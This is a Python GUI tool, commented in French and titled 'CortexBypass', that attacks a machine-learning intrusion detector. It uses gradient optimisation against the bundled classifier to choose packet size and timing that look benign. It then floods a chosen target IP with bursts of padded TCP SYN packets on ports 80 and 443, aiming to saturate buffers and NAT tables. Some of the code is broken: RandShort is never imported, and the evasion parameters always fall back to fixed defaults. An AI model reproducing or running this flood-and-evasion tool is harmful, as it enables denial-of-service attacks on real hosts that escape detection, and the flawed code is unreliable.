import tkinter as tk
from tkinter import ttk, messagebox
import threading
import time
import numpy as np
import joblib
import base64
import io
import torch
import torch.nn as nn
from scapy.all import IP, TCP, send
import psutil

# --- ARCHITECTURE DU MODÈLE ---
class NetworkClassifier(nn.Module):
    def __init__(self, input_dim):
        super().__init__()
        self.net = nn.Sequential(
            nn.Linear(input_dim, 256), nn.BatchNorm1d(256), nn.ReLU(), nn.Dropout(0.3),
            nn.Linear(256, 128), nn.BatchNorm1d(128), nn.ReLU(), nn.Dropout(0.3),
            nn.Linear(128, 64), nn.BatchNorm1d(64), nn.ReLU(), nn.Dropout(0.2),
            nn.Linear(64, 32), nn.ReLU(),
            nn.Linear(32, 1), nn.Sigmoid(),
        )
    def forward(self, x): return self.net(x).squeeze(1)

class CortexBypassApp:
    def __init__(self, root):
        self.root = root
        self.root.title("CortexBypass // Adversarial Red Team")
        self.root.geometry("600x550")
        self.root.configure(bg="#1a1a1a")
        
        self.attacking = False
        self.setup_ui()
        self.load_brain()

    def setup_ui(self):
        # ... (Garder ton code UI actuel ici ou utiliser celui-ci)
        tk.Label(self.root, text="CORTEXBYPASS v1.0", fg="#ff4d4d", bg="#1a1a1a", font=("Consolas", 18, "bold")).pack(pady=10)
        
        frame = tk.Frame(self.root, bg="#1a1a1a")
        frame.pack(pady=10)

        tk.Label(frame, text="Target IP:", fg="#ff4d4d", bg="#1a1a1a").grid(row=0, column=0, padx=5)
        self.target_entry = tk.Entry(frame, bg="#333", fg="white")
        self.target_entry.insert(0, "127.0.0.1")
        self.target_entry.grid(row=0, column=1)

        tk.Label(frame, text="Interface:", fg="#ff4d4d", bg="#1a1a1a").grid(row=1, column=0, padx=5)
        self.iface_combo = ttk.Combobox(frame, values=list(psutil.net_if_addrs().keys()))
        self.iface_combo.current(0)
        self.iface_combo.grid(row=1, column=1, pady=5)

        self.status_label = tk.Label(self.root, text="STATUS: READY", fg="#00ff00", bg="#1a1a1a", font=("Consolas", 12))
        self.status_label.pack(pady=5)

        self.log = tk.Text(self.root, height=12, width=70, bg="black", fg="#ff4d4d", font=("Consolas", 9))
        self.log.pack(padx=20, pady=10)

        self.btn_attack = tk.Button(self.root, text="LAUNCH ADVERSARIAL ATTACK", bg="#440000", fg="white", 
                                    font=("Consolas", 12, "bold"), command=self.toggle_attack)
        self.btn_attack.pack(pady=10)

    def load_brain(self):
        try:
            import models_data as md
            self.scaler = joblib.load(io.BytesIO(base64.b64decode(md.SCALER)))
            raw_features = joblib.load(io.BytesIO(base64.b64decode(md.FEATURES)))
            self.features_list = list(raw_features.flatten()) if hasattr(raw_features, 'flatten') else list(raw_features)
            
            model_bytes = base64.b64decode(md.MODELE)
            checkpoint = torch.load(io.BytesIO(model_bytes), map_location="cpu", weights_only=False)
            self.model = NetworkClassifier(input_dim=checkpoint["input_dim"])
            self.model.load_state_dict(checkpoint["model_state_dict"])
            self.model.eval()
            self._log("[SYSTEM] IA de CortexNet chargée.")
        except Exception as e:
            messagebox.showerror("Error", f"Brain Load Failed: {e}")

    def _log(self, msg):
        self.log.insert("end", f"> {msg}\n")
        self.log.see("end")

    def toggle_attack(self):
        if not self.attacking:
            self.attacking = True
            self.btn_attack.config(text="STOP ATTACK", bg="#ff4d4d")
            self.status_label.config(text="STATUS: ATTACKING...", fg="#ff4d4d")
            # C'est ici que Python cherche 'self.attack_loop'
            threading.Thread(target=self.attack_loop, daemon=True).start()
        else:
            self.attacking = False
            self.btn_attack.config(text="LAUNCH ADVERSARIAL ATTACK", bg="#440000")
            self.status_label.config(text="STATUS: READY", fg="#00ff00")

    # --- LA MÉTHODE MANQUANTE / CORRIGÉE ---
    def attack_loop(self):
        target_ip = self.target_entry.get()
        iface = self.iface_combo.get()
        
        self._log(f"Calcul de l'évasion adverse pour {target_ip}...")
        
        # 1. Optimisation par Gradient (Inversion de Modèle)
        dos_vector = np.zeros(len(self.features_list))
        x_adv = torch.tensor(self.scaler.transform([dos_vector]), dtype=torch.float32, requires_grad=True)
        optimizer = torch.optim.Adam([x_adv], lr=0.01)
        
        for _ in range(50):
            optimizer.zero_grad()
            loss = nn.BCELoss()(self.model(x_adv), torch.tensor([0.0]))
            loss.backward()
            optimizer.step()

        # 2. Extraction du vecteur Furtif
        stealth_params = self.scaler.inverse_transform(x_adv.detach().numpy()).flatten()
        
        # 3. Mappage des paramètres Scalaires (Correctif TypeError)
        try:
            val_taille = float(stealth_params) if len(stealth_params) > 4 else 500
            val_debit  = float(stealth_params) if len(stealth_params) > 13 else 10.0
            pkt_size = int(abs(val_taille) % 1400) + 64
            delay = 1.0 / (abs(val_debit) + 1.0)
            if delay > 0.1: delay = 0.05
        except:
            pkt_size, delay = 512, 0.02

        self._log(f"Signature trouvée : Taille={pkt_size}B, Délai={delay:.4f}s")
        self._log("Envoi du flux adverse (Bypass activé)...")

        # 4. Boucle d'envoi Scapy
        # --- OPTIMISATION DES LOGS SCAPY ---
        from scapy.all import conf
        conf.verb = 0 # Force Scapy à rester silencieux (plus de warnings MAC)

            # Configuration agressive
        while self.attacking:
            try:
                # 1. On crée une LISTE de paquets pour saturer le buffer réseau d'un coup
                # On utilise des ports d'entrée très variés pour saturer la table NAT
                pkt = IP(dst=target_ip)/TCP(sport=RandShort(), dport=(443,80), flags="S")/("X" * pkt_size)
                
                # 2. On envoie 100 paquets par cycle au lieu de 20
                # 'inter=0' force l'envoi sans aucune pause entre les paquets
                send(pkt, verbose=False, count=100, inter=0, real_time=True)
                
            except Exception:
                break

if __name__ == "__main__":
    root = tk.Tk()
    app = CortexBypassApp(root)
    root.mainloop()